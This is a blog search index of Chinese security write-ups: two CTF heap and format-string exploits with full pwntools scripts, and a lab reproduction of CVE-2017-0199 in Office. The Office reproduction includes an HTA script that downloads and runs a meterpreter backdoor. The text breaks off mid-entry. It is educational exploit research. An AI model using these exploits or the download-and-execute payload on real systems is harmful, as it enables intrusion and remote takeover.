<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>0CTF2018 babyheap</title>
      <link href="/2020/03/12/0CTF2018%20babyheap/"/>
      <url>/2020/03/12/0CTF2018%20babyheap/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h2><p>主要在<strong>update</strong>处会有一字节溢出漏洞</p><a id="more"></a><p><img src="https://upload-images.jianshu.io/upload_images/8447551-7d52f418e79e32de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="update"></p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>题目保护机制全开<br><img src="https://upload-images.jianshu.io/upload_images/8447551-77e91fd38c050144.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="checksec"><br>申请不对齐<strong>0x10</strong>(<strong>0x_8</strong>)的堆，再利用<strong>one_byte_off</strong>可修改下一个堆块的<strong>size</strong>位。大体思路是利用<strong>fastbin attack</strong>，但由于是<strong>full relro</strong>，所以<strong>got</strong>表不可写，所以考虑用<strong>one_gadget</strong>覆盖<strong>malloc_hook</strong>。<strong>第一步-leak libc_base</strong>：布置出叠在一起的两个堆，修改后一个堆块到<strong>unsor tbin</strong>的范围内<strong>free</strong>掉后再<strong>view</strong>前一个堆块可泄露出<strong>libc</strong>的基址。<strong>第二步-fastbin attack</strong>：由于在<strong>malloc_hook</strong>上方没有发现合适的<strong>size</strong>位用来伪造，所以准备直接把<strong>size</strong>当成堆的首地址，让其进入<strong>main_arena</strong>中的<strong>fastbinY</strong>中，然后再构造<strong>fastbin attack</strong>修改<strong>last reminder</strong>地址到<strong>malloc_hook</strong>上方，再次<strong>malloc</strong>时即可申请到<strong>malloc_hook</strong>并修改。</p><blockquote><p>在做堆题时，由于会构造许多伪堆块，所以我们应该对每个真实的堆块、指针以及编号进行备注，这样会提高调试的效率，也不容易弄混淆。在进行关键步骤时，可每做完一次操作马上观察是否达到了预期的效果。</p></blockquote><h2 id="my-exp"><a href="#my-exp" class="headerlink" title="my-exp"></a>my-exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">one_gadget = [<span class="number">0x45216</span> , <span class="number">0x4526a</span> , <span class="number">0xf02a4</span> , <span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./babyheap'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'time is up;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recv(<span class="number">1024</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(index , size , content)</span>:</span></span><br><span class="line">    p.recv(<span class="number">1024</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recv(<span class="number">1024</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recv(<span class="number">1024</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> pidof(p)[<span class="number">0</span>]</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"><span class="comment">#step1 leak libc_base</span></span><br><span class="line">allocate(<span class="number">0x18</span>)          <span class="comment">#0  00</span></span><br><span class="line">allocate(<span class="number">0x18</span>)          <span class="comment">#1  20</span></span><br><span class="line">allocate(<span class="number">0x18</span>)          <span class="comment">#2  40</span></span><br><span class="line">allocate(<span class="number">0x40</span>)          <span class="comment">#3  60</span></span><br><span class="line">allocate(<span class="number">0x18</span>)          <span class="comment">#4  b0</span></span><br><span class="line">allocate(<span class="number">0x58</span>)          <span class="comment">#5  d0</span></span><br><span class="line">update(<span class="number">0</span> , <span class="number">0x19</span> , <span class="string">'a'</span> * <span class="number">0x18</span> + <span class="string">'\x41'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">allocate(<span class="number">0x30</span>)          <span class="comment">#1  20</span></span><br><span class="line">update(<span class="number">1</span> , <span class="number">0x20</span> , <span class="string">'\x00'</span> * <span class="number">0x18</span> + <span class="string">'\x91'</span> + <span class="string">'\x00'</span> * <span class="number">7</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">aaa = view(<span class="number">1</span>)</span><br><span class="line">aaa = aaa.rstrip(<span class="string">'\n'</span>)[<span class="number">-8</span>:]</span><br><span class="line">libc.address = u64(aaa) - <span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="string">'libc_base =&gt; '</span> + hex(libc.address))</span><br><span class="line">dst_addr = libc.address + <span class="number">0x3c4b40</span></span><br><span class="line">success(<span class="string">'dst_addr =&gt; '</span> + hex(dst_addr))</span><br><span class="line">malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">success(<span class="string">'malloc_hook =&gt; '</span> + hex(malloc_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment">#step2 fastbin_attack to main_arena</span></span><br><span class="line">allocate(<span class="number">0x58</span>)          <span class="comment">#2  40</span></span><br><span class="line">update(<span class="number">2</span> , <span class="number">0x20</span> , <span class="string">'\x00'</span> * <span class="number">0x18</span> + <span class="string">'\x51'</span> + <span class="string">'\x00'</span> * <span class="number">7</span>)</span><br><span class="line">allocate(<span class="number">0x20</span>)          <span class="comment">#3  a0</span></span><br><span class="line">update(<span class="number">3</span> , <span class="number">0x10</span> , <span class="string">'\x00'</span> * <span class="number">0x8</span> + <span class="string">'\x21'</span> + <span class="string">'\x00'</span> * <span class="number">7</span>)</span><br><span class="line">allocate(<span class="number">0x40</span>)          <span class="comment">#6  60</span></span><br><span class="line">update(<span class="number">6</span> , <span class="number">0x40</span> , <span class="string">'\x00'</span> * <span class="number">0x38</span> + <span class="string">'\x31'</span> + <span class="string">'\x00'</span> * <span class="number">7</span>)</span><br><span class="line">update(<span class="number">3</span> , <span class="number">0x20</span> , <span class="string">'\x00'</span> * <span class="number">0x18</span> + <span class="string">'\x21'</span> + <span class="string">'\x00'</span> * <span class="number">7</span>)</span><br><span class="line">update(<span class="number">5</span> , <span class="number">0x10</span> , <span class="string">'\x00'</span> * <span class="number">8</span> + <span class="string">'\x51'</span> + <span class="string">'\x00'</span> * <span class="number">7</span>)</span><br><span class="line">update(<span class="number">2</span> , <span class="number">0x20</span> , <span class="string">'\x00'</span> * <span class="number">0x18</span> + <span class="string">'\x61'</span> + <span class="string">'\x00'</span> * <span class="number">7</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">update(<span class="number">2</span> , <span class="number">0x28</span> , <span class="string">'\x00'</span> * <span class="number">0x18</span> + <span class="string">'\x61'</span> + <span class="string">'\x00'</span> * <span class="number">7</span> + <span class="string">'\x41'</span> + <span class="string">'\x00'</span> * <span class="number">7</span>)</span><br><span class="line">allocate(<span class="number">0x50</span>)          <span class="comment">#6  60</span></span><br><span class="line">allocate(<span class="number">0x30</span>)          <span class="comment">#7  130</span></span><br><span class="line">update(<span class="number">2</span> , <span class="number">0x59</span> , <span class="string">'\x00'</span> * <span class="number">0x18</span> + <span class="string">'\x41'</span> + <span class="string">'\x00'</span> * <span class="number">0x3f</span> + <span class="string">'\x41'</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">allocate(<span class="number">0x38</span>)          <span class="comment">#3  a0</span></span><br><span class="line">update(<span class="number">3</span> , <span class="number">0x29</span> , <span class="string">'\x00'</span> * <span class="number">0x28</span> + <span class="string">'\x41'</span>)</span><br><span class="line">update(<span class="number">5</span> , <span class="number">0x39</span> , <span class="string">'\x00'</span> * <span class="number">0x38</span> + <span class="string">'\x21'</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">update(<span class="number">3</span> , <span class="number">0x38</span> , <span class="string">'\x00'</span> * <span class="number">0x28</span> + <span class="string">'\x41'</span> + <span class="string">'\x00'</span> * <span class="number">7</span> + p64(dst_addr))</span><br><span class="line">allocate(<span class="number">0x30</span>)          <span class="comment">#5  </span></span><br><span class="line">allocate(<span class="number">0x30</span>)          <span class="comment">#8  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#step3 overwirte top_chunk_ptr above malloc_hook</span></span><br><span class="line">update(<span class="number">8</span> , <span class="number">0x30</span> , <span class="string">'\x00'</span> * <span class="number">0x28</span> + p64(malloc_hook - <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#step4 malloc a new chunk &amp; overwrite malloc_hook to one_gadget</span></span><br><span class="line">allocate(<span class="number">0x10</span>)          <span class="comment">#9  </span></span><br><span class="line">update(<span class="number">9</span> , <span class="number">0x8</span> , p64(libc.address + one_gadget[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-0199 Microsoft Office 逻辑漏洞复现和利用</title>
      <link href="/2020/03/12/CVE-2017-0199%20Microsoft%20Office%20%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8/"/>
      <url>/2020/03/12/CVE-2017-0199%20Microsoft%20Office%20%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00漏洞简介"><a href="#0x00漏洞简介" class="headerlink" title="0x00漏洞简介"></a>0x00漏洞简介</h2><p>该漏洞是去年四月FireEye公布的一个OFFICE 0day，在无需用户交互的情况下，打开word文档就可以通过hta脚本执行任意代码。经过研究发现，此漏洞的成因主要是word在处理内嵌OLE2LINK对象时，通过网络更新对象时没有正确处理的Content-Type所导致的一个逻辑漏洞。</p><blockquote><p><strong>受影响的版本</strong><br>Microsoft Office 2016<br>Microsoft Office 2013<br>Microsoft Office 2010<br>Microsoft Office 2007</p></blockquote><a id="more"></a><h2 id="0x01复现过程"><a href="#0x01复现过程" class="headerlink" title="0x01复现过程"></a>0x01复现过程</h2><p>首先，创建一个正常的word文档，作为将要链接的rtf对象，就叫做<strong>test.docx</strong>吧。<br><img src="http://upload-images.jianshu.io/upload_images/8447551-54315bcdda14f03f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="test.docx"><br>然后，将<strong>test.docx</strong>重命名为<strong>test.rtf</strong>后放到<strong>Apache</strong>服务器上面，并创建另一个文档，选择插入-&gt;对象-&gt;由文件创建，输入rtf文件路径后选择<strong>链接到文件</strong>。然后将该文件另存为rtf文件，就叫他<strong>exp.rtf</strong>吧。</p><p><img src="http://upload-images.jianshu.io/upload_images/8447551-63c2672676d6df20.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="exp.rtf"></p><p>此时，打开<strong>exp.rtf</strong>可以看到刚刚链接的<strong>test.rtf</strong>是以一个整体的格式显示。<br><img src="http://upload-images.jianshu.io/upload_images/8447551-528fc0261d8112fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="exp.rtf"></p><p>这时，我们在服务器端修改<strong>test.rtf</strong>文件为<strong>Visual Script Script</strong>代码<strong>需要注意反斜杠的转义</strong>，这段代码将弹出本地计算器。<br><img src="http://upload-images.jianshu.io/upload_images/8447551-161671ae07ff0dde.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="test.rtf"></p><p>当然，需要改一下<strong>Apache</strong>的配置，该代码会将该目录下的文件识别为<strong>hta脚本</strong>，然后重启服务器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &#x2F;var&#x2F;www&#x2F;html&#x2F;test&#x2F;&gt;</span><br><span class="line">    Header set Content-Type &quot;application&#x2F;hta&quot;</span><br><span class="line">&lt;&#x2F;Dirctory&gt;</span><br></pre></td></tr></table></figure><p>点击<strong>“是”</strong>即可弹出计算器，此时用<strong>010Editor</strong>打开该文档，将<strong>\object\objautlink\rsltpict</strong>替换为<strong>\object\objautlink\objupdate\rsltpict</strong>，虽然仍然会有提示，但不需与用户交互，计算器便会自行弹出。</p><p><img src="http://upload-images.jianshu.io/upload_images/8447551-1ffb9f1dfbc1ef1d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="修改前1"><br><img src="http://upload-images.jianshu.io/upload_images/8447551-0a66277691cafba7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="修改前2"><br><img src="http://upload-images.jianshu.io/upload_images/8447551-eff87a7b99ddbd4f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="修改后"></p><h2 id="0x02利用过程"><a href="#0x02利用过程" class="headerlink" title="0x02利用过程"></a>0x02利用过程</h2><p>由上述部分，我们已经可以成功在打开<strong>exp.rtf</strong>的电脑上执行<strong>VBS代码</strong>，现在思路为<strong>将服务端的后门下载到本地运行，在远程监听，即可实现利用。</strong></p><ul><li>后门准备</li></ul><p>利用最<strong>metasploit</strong>生成喜闻乐见的<strong>meterpreter</strong>后门，放在与<strong>test.rtf</strong>相同目录下。<br><img src="http://upload-images.jianshu.io/upload_images/8447551-ff939244749fec70.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="后门准备"></p><ul><li>修改代码</li></ul><p>由于前面漏洞复现的时候已经有了<strong>VBS</strong>运行程序的代码，只需再找一条下载文件的代码就行了，代码如下。</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">a=<span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>);</span><br><span class="line">a.run(<span class="string">"PowerShell -WindowStyle Hidden (New-Object System.Net.Webclient).DownloadFile('http://192.168.43.153/test/shell.exe','%temp%\\aaa.exe');"</span>,<span class="number">0</span>,ture);</span><br><span class="line">a.run(<span class="comment">'%temp%\\aaa.exe',0);window.close();</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>服务器监听</li></ul><p>用<strong>metasploit</strong>配置监听本地端口。<br><img src="http://upload-images.jianshu.io/upload_images/8447551-56ccacd6457370bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="服务器监听"></p><ul><li>反弹shell</li></ul><p>在靶机上打开<strong>exp.rtf</strong>，进程中出现下载到本地的后门<strong>aaa.exe</strong>。返回服务器查看，shell反弹成功。<br><img src="http://upload-images.jianshu.io/upload_images/8447551-0d19b78406ff045b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="执行成功"><br><img src="http://upload-images.jianshu.io/upload_images/8447551-46a003cc4e4b3d89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="反弹成功"></p><h2 id="0x03参考文章"><a href="#0x03参考文章" class="headerlink" title="0x03参考文章"></a>0x03参考文章</h2><p><a href="https://www.hackersb.cn/hacker/228.html" target="_blank" rel="noopener">Tuuu’s Blog</a><br><a href="http://www.4hou.com/technology/4260.html" target="_blank" rel="noopener"><strong>嘶吼</strong>的一篇文章</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerability </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF2017 level2的两道pwn题</title>
      <link href="/2020/03/12/HCTF2017%20Level2%E7%9A%84%E4%B8%A4%E9%81%93pwn%E9%A2%98/"/>
      <url>/2020/03/12/HCTF2017%20Level2%E7%9A%84%E4%B8%A4%E9%81%93pwn%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-一些歪道理"><a href="#0x00-一些歪道理" class="headerlink" title="0x00 一些歪道理"></a>0x00 一些歪道理</h2><p>比赛时pwn是肯定pwn不出来的，只有靠赛后复现才能够勉强维持得了尊严。不过确实能学到一些知识啊~</p><a id="more"></a><h2 id="0x01-Guestbook"><a href="#0x01-Guestbook" class="headerlink" title="0x01 Guestbook"></a>0x01 Guestbook</h2><ul><li><strong>题目信息</strong></li></ul><p>该题目是一个Linux下32位的动态链接可执行文件并且checksec显示开了所有的保护机制。程序有<strong>add</strong>、<strong>see</strong>、<strong>del</strong>三个功能，能够增加客人、查看客人、删除客人。<img src="http://upload-images.jianshu.io/upload_images/8447551-5403723eaff21cbc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="checksec"></p><ul><li><strong>漏洞位置</strong></li></ul><p>通过ida反汇编分析可得到数据结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">guest</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;    <span class="comment">//我也不知道这是啥反正永远那都是1</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> *<span class="title">heap_ptr</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap_ptr</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> phone[<span class="number">16</span>];</span><br><span class="line">&#125;    <span class="comment">//malloc了大小为16的空间用于存放phone</span></span><br></pre></td></tr></table></figure><p>并且最多<strong>add</strong>10个guest，在<strong>see</strong>功能处有明显的格式化字符串漏洞，在<strong>del</strong>时会将<strong>name</strong>域请零，并且将<strong>heap_ptr</strong>指向<strong>phone</strong>的指针给<strong>free</strong>掉。<img src="http://upload-images.jianshu.io/upload_images/8447551-339f7cc02478c519.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="漏洞位置"></p><ul><li><strong>利用思路</strong><br>由于保护机制全开，首先需要利用格式化字符串<strong>leak</strong>程序及<strong>libc</strong>基址，但是<strong>got表</strong>不可写，常用的格式化字符串写<strong>got表</strong>思路不可取。而在调用<strong>del</strong>时会调用<strong>free(heap_ptr)</strong>，进而出发触发<strong>free_hook</strong>。若将<strong>free_hook</strong>劫持为<strong>system</strong>函数，<strong>heap_ptr</strong>指向<strong>/bin/sh</strong>字符串，则可起shell。</li></ul><blockquote><p><strong>hook</strong><br>一些函数存在<strong>hook</strong>指针供调试使用(如<strong>free</strong>、<strong>malloc</strong>等)，通常为空指针，若<strong>hook</strong>值不为空，则在调用该函数之前先调用<strong>hook</strong>中的函数。</p></blockquote><ul><li><strong>My-exp</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">'./guestbook'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib32/libc-2.23.so'</span>)</span><br><span class="line">gdb.attach(p , open(<span class="string">'aa'</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'47.100.64.171'</span> , <span class="number">20002</span>)<span class="comment">#nc 47.100.64.171 20002</span></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name)</span>:</span></span><br><span class="line">p.recv(<span class="number">1024</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name?\n'</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line">p.recvuntil(<span class="string">'phone?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'1234567812345678'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">see</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recv(<span class="number">1024</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index:\n'</span>)</span><br><span class="line">p.sendline(index)</span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">ret = p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recv(<span class="number">1024</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index:\n'</span>)</span><br><span class="line">p.sendline(index)</span><br><span class="line">p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./guestbook'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#step1 use fsb to leak libc &amp; elf base by the way find some func addr</span></span><br><span class="line">add(<span class="string">'%p-%3$p'</span>)</span><br><span class="line">leak = see(<span class="string">'0'</span>)</span><br><span class="line">elf.address = int(leak.split(<span class="string">'-'</span>)[<span class="number">0</span>] , <span class="number">16</span>) - <span class="number">0xe3a</span></span><br><span class="line">libc.address = int(leak.split(<span class="string">'-'</span>)[<span class="number">1</span>] , <span class="number">16</span>) - <span class="number">0x1b0da7</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">free_hook = libc.address + <span class="number">0x1b18b0</span></span><br><span class="line">heap_ptr = elf.address + <span class="number">0x3064</span></span><br><span class="line">log.info(<span class="string">'elf_addr =&gt; '</span> + hex(elf.address))</span><br><span class="line">log.info(<span class="string">'libc_addr =&gt; '</span> + hex(libc.address))</span><br><span class="line">log.info(<span class="string">'system_addr =&gt; '</span> + hex(system_addr))</span><br><span class="line">log.info(<span class="string">'binsh_addr =&gt; '</span> + hex(binsh_addr))</span><br><span class="line">log.info(<span class="string">'free_hook =&gt; '</span> + hex(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment">#step2 write free_hook with system</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">length = ord(p32(system_addr)[i])</span><br><span class="line">payload = <span class="string">'aaa'</span> + p32(free_hook + i)</span><br><span class="line">payload += <span class="string">'%'</span> + str(length - len(payload)) + <span class="string">'c%8$hhn'</span></span><br><span class="line">add(payload)</span><br><span class="line">see(str(i + <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#step3 write heap_ptr with binsh</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">length = ord(p32(binsh_addr)[i])</span><br><span class="line">payload = <span class="string">'aaa'</span> + p32(heap_ptr + i)</span><br><span class="line">payload += <span class="string">'%'</span> + str(length - len(payload)) + <span class="string">'c%8$hhn'</span></span><br><span class="line">add(payload)</span><br><span class="line">see(str(i + <span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#step4 call free(heap_ptr) -&gt; free_hook(heap_ptr) -&gt; system('/bin/sh')</span></span><br><span class="line">p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="0x02-Babyprintf"><a href="#0x02-Babyprintf" class="headerlink" title="0x02 Babyprintf"></a>0x02 Babyprintf</h2><ul><li><strong>题目信息</strong></li></ul><p>该题目是一个Linux下64位的动态链接可执行文件并且checksec显示开了所有的保护机制。能够自己定义<strong>size</strong>大小，输入<strong>string</strong>得到<strong>result</strong>然后一直循环这个过程。<br><img src="http://upload-images.jianshu.io/upload_images/8447551-09854511818a7dba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" 